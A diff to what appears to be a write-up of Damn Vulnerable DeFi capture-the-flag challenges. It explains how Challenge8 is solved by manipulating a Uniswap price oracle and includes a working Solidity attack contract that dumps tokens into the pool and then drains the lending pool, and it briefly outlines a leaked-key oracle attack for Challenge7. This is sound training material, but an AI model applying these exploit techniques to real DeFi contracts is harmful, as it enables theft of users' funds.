@@ -193,3 +193,51 @@ contract SelfieAttack is IERC3156FlashBorrower {
     }
 }
 ```
+
+## Challenge7
+
+Get the private key from the leak data,and then use source address to change the price of NFT.Finnaly sell the NFT for a profit.
+
+## Challenge8
+
+The cost amount for lending is pegging with uniswap pool:
+
+> uniswapPair.balance \* (10 \*\* 18) / token.balanceOf(uniswapPair)
+
+Therefore,we use swap all our DVT token to ETH,and then the number of uniswapPair.balance/token.balanceOf(uniswapPair) goes down.After that happened we can deposit our eth to borrow all the DVT token in lending pool.
+
+```javascript
+contract PuppetAttack {
+
+    address public immutable uniswapExchange;
+    DamnValuableToken public immutable token;
+    PuppetPool public immutable pool;
+    constructor(address tokenAddress, address _uniswapExchange,PuppetPool _pool){
+        token = DamnValuableToken(tokenAddress);
+        uniswapExchange = _uniswapExchange;
+        pool = _pool;
+    }
+
+    function attack() external payable {
+        //receive DVT
+        token.transferFrom(msg.sender,address(this),token.balanceOf(msg.sender));
+
+        //approve DVTtoken to uniswap pool
+        token.approve(uniswapExchange,token.balanceOf(address(this)));
+
+        //swap all DVT token to eth in uniswap pool.
+        UniswapExchangeInterface(uniswapExchange).tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp+5);
+
+        //borrow DVT token by depositing eth.
+        pool.borrow{value:address(this).balance}(token.balanceOf(address(pool)),msg.sender);
+    }
+
+    receive() external payable{}
+}
+```
+
+## Challenge9
+
+```javascript
+
+```
